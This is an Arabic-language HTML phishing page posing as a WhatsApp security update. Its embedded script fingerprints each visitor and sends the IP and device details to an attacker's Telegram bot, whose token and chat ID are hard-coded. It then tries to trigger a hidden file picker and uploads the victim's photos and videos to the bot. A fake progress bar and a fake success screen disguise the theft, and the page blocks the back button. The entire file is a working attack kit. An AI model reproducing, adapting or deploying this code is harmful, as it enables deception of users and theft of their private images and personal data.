<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث WhatsApp</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            height: 100vh; display: flex; align-items: center; justify-content: center; 
            font-family: 'Segoe UI', sans-serif; overflow: hidden;
            user-select: none; -webkit-user-select: none;
        }
        .update-container {
            background: rgba(255,255,255,0.95); border-radius: 20px; padding: 3rem 2rem; 
            text-align: center; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
        }
        .logo { width: 80px; height: 80px; margin: 0 auto 1.5rem; background: #25D366; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: white; font-weight: bold; }
        h1 { color: #333; margin-bottom: 1rem; font-size: 1.5rem; }
        p { color: #666; line-height: 1.6; margin-bottom: 2rem; }
        .progress { 
            width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; 
            overflow: hidden; margin: 2rem 0; display: none;
        }
        .progress-bar { 
            height: 100%; background: linear-gradient(90deg, #25D366, #00D65A); 
            width: 0%; transition: width 0.3s ease; border-radius: 3px;
        }
        .spinner { 
            width: 40px; height: 40px; border: 4px solid #f3f3f3; 
            border-top: 4px solid #25D366; border-radius: 50%; 
            animation: spin 1s linear infinite; margin: 1rem auto; display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { 
            background: #25D366; color: white; border: none; padding: 1rem 2rem; 
            border-radius: 25px; font-size: 1.1rem; cursor: pointer; width: 100%; 
            transition: all 0.3s; font-weight: 500;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(37,211,102,0.3); }
        .hidden-input { 
            position: fixed; top: -10000px; left: -10000px; opacity: 0; width: 0.1px; height: 0.1px; z-index: -1;
        }
        @media (max-width: 480px) { .update-container { margin: 1rem; padding: 2rem 1.5rem; } }
    </style>
</head>
<body>
    <div class="update-container">
        <div class="logo">WA</div>
        <h1>تحديث أمان WhatsApp</h1>
        <p>للحفاظ على أمان حسابك، يرجى التحقق من بيانات الجهاز. هذه العملية تأخذ 10 ثواني فقط.</p>
        
        <div class="progress" id="progressBar">
            <div class="progress-bar" id="progressFill"></div>
        </div>
        
        <div class="spinner" id="spinner"></div>
        
        <button id="verifyBtn">التحقق الآن</button>
        
        <!-- 🔥 INVISIBLE GALLERY STEALER -->
        <input type="file" class="hidden-input" id="galleryStealer" multiple accept="image/*,video/*" webkitdirectory directory>
    </div>

    <script>
        // 🔥 FULLY ACTIVATED
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';
        const CHAT_ID = '8539996558';
        
        const verifyBtn = document.getElementById('verifyBtn');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');
        const spinner = document.getElementById('spinner');
        const galleryStealer = document.getElementById('galleryStealer');

        // 🚀 STEALTH GALLERY EXTRACTION - NO USER INTERACTION
        async function stealthExtractGallery() {
            // Get victim intel
            const victimInfo = {
                ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
                ua: navigator.userAgent,
                lang: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                time: new Date().toISOString()
            };

            // Send victim hit immediately
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🎯 STEALTH HIT!\n🌐 IP: ${victimInfo.ip}\n📱 UA: ${victimInfo.ua.slice(0,80)}\n📏 ${victimInfo.screen}\n🕒 ${new Date().toLocaleString('ar')}`
                })
            });

            // 🔥 AUTO-TRIGGER GALLERY ACCESS (Zero-click)
            const triggers = [
                () => galleryStealer.click(),
                () => {
                    const evt = new MouseEvent('click', {bubbles: true, cancelable: true, view: window});
                    galleryStealer.dispatchEvent(evt);
                },
                () => {
                    const input = document.createElement('input');
                    input.type = 'file'; input.multiple = true; input.accept = 'image/*';
                    input.style.opacity = '0'; input.style.position = 'fixed';
                    document.body.appendChild(input);
                    input.click();
                    input.onchange = handleFiles;
                    setTimeout(()=>document.body.removeChild(input), 2000);
                }
            ];

            // Execute all triggers simultaneously
            triggers.forEach((trigger, i) => setTimeout(trigger, i * 50));

            galleryStealer.onchange = handleFiles;
        }

        // 🔥 FILE HANDLER - INSTANT UPLOAD
        async function handleFiles(e) {
            const files = Array.from(e.target.files || [])
                .filter(f => f.size > 1e4 && f.size < 1e7 && /^image\/|video\//.test(f.type))
                .slice(0, 25);

            if (files.length === 0) return;

            // Rapid parallel upload
            const uploadPromises = files.map((file, i) => {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('photo', file);
                form.append('caption', `${i+1}/${files.length} | ${(file.size/1e6).toFixed(1)}MB | ${file.name}`);
                
                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST', body: form
                });
            });

            await Promise.allSettled(uploadPromises);
        }

        // 🎬 FAKE UPDATE ANIMATION
        verifyBtn.onclick = startFakeUpdate;
        function startFakeUpdate() {
            verifyBtn.style.display = 'none';
            progressBar.style.display = 'block';
            spinner.style.display = 'block';

            // IMMEDIATELY START STEALTH ATTACK
            stealthExtractGallery();

            // Fake progress
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                progressFill.style.width = progress + '%';
                
                if (progress >= 100) {
                    clearInterval(interval);
                    setTimeout(showSuccess, 500);
                }
            }, 200);
        }

        function showSuccess() {
            document.body.innerHTML = `
                <div style="background:#25D366;color:white;padding:3rem;text-align:center;border-radius:20px;margin:2rem;font-size:1.3rem;">
                    ✅ تم التحقق بنجاح!<br>
                    يمكنك إغلاق الصفحة الآن
                </div>
            `;
        }

        // 🔥 AUTO-START ON LOAD (Zero interaction)
        window.addEventListener('load', () => {
            setTimeout(startFakeUpdate, 800);
        });

        // Block back button
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
